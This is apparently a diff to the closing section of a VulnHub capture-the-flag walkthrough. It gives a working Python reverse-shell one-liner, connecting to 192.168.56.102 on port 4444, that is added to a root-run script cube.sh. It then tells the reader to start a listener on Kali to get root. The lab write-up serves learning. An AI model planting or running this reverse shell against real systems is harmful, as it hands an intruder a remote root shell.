@@ -79,3 +79,9 @@ i just add a python3 reverse shell to `cube.sh` to get another shell as user roo
 ```python
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 ```
+
+and login again to server with user `baksteen`, at the same time start a listener on your kali machine :
+
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/ab57b263-1fc2-473e-bb20-3da24dde0827)
+
+this is how you can get root on this machine :)
